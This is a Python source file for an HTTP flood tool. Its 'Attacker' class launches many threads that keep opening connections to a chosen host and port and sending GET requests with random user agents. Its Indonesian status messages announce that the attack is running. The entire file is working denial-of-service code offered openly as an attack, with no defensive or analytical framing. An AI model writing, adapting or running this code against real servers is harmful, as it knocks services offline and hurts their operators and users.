import socket
import threading
import random
import time
from core import utils

class Attacker:
    def __init__(self, target, port, threads):
        self.target = target
        self.port = port
        self.threads = threads
        self.running = True
        self.user_agents = utils.load_user_agents()

    def run(self):
        print(f"[+] Menjalankan {self.threads} threads untuk menyerang {self.target}:{self.port}")
        for _ in range(self.threads):
            thread = threading.Thread(target=self.attack)
            thread.daemon = True
            thread.start()

    def attack(self):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((self.target, self.port))
                
                user_agent = random.choice(self.user_agents)
                http_header = f"GET / HTTP/1.1\r\nHost: {self.target}\r\nUser-Agent: {user_agent}\r\nConnection: keep-alive\r\n\r\n"
                
                s.send(http_header.encode('utf-8'))
                print(f"[+] Serangan dikirim ke {self.target}:{self.port}")
                s.close()
            except Exception as e:
                print(f"[-] Error: {e}")
            time.sleep(0.1)

    def stop(self):
        self.running = False
        print("[!] Menghentikan serangan...")
